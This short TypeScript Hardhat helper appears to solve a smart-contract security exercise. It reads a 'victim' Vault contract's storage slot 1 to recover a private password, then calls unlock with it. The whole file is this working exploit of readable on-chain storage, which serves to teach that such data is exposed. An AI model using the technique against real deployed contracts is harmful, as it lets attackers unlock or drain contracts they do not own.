import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  const password = await waffle.provider.getStorageAt(victim.address, 1);
  const vaultFactory = await ethers.getContractFactory("Vault");
  const vaultContract = await vaultFactory.attach(victim.address);
  await vaultContract.unlock(password);
};

export default helper;
